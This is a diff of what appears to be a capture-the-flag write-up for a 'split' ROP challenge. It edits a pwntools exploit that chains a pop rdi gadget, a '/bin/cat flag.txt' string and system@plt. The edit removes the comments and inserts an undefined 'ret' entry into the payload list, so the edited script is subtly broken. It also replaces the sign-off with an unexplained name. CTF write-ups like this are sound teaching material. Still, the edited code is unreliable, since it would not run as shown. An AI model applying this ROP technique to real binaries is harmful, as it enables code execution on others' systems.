@@ -220,29 +220,21 @@ from pwn import *
 context.binary = './split'
 context.log_level = 'info'
 
-# Addresses we found
-pop_rdi = 0x4007c3           # pop rdi; ret gadget
-string_cat = 0x00601060       # "/bin/cat flag.txt" in .data
-system_plt = 0x400560         # system@plt
+pop_rdi = 0x4007c3           
+string_cat = 0x00601060       
+system_plt = 0x400560         
 
-# Build the payload
 payload = flat([
-    b'A' * 40,                # Padding to reach return address
-    pop_rdi,                  # pop rdi; ret
-    string_cat,               # address of "/bin/cat flag.txt"
-    system_plt                # call system()
+    b'A' * 40,                
+    pop_rdi,                  
+    string_cat,               
+     ret,                     
+    system_plt                
 ])
 
-# Launch the process
 p = process('./split')
-
-# Receive until the prompt
 p.recvuntil(b'> ')
-
-# Send the payload
 p.send(payload)
-
-# Get the flag!
 p.interactive()
 ```
 
@@ -270,7 +262,7 @@ Contriving a reason to ask user for data...
 > $ 
 ```
 
-**Flag obtained: `ROPE{a_placeholder_32byte_flag!}`** 🎉
+**Flag obtained: `ROPE{a_placeholder_32byte_flag!}`** 
 
 ---
 
@@ -284,4 +276,4 @@ Contriving a reason to ask user for data...
 6. **Existing String**: The binary conveniently contains `"/bin/cat flag.txt"` in `.data`
 
 
-**Happy Hacking!** 🚀
+**Scaramouch_volkov** 
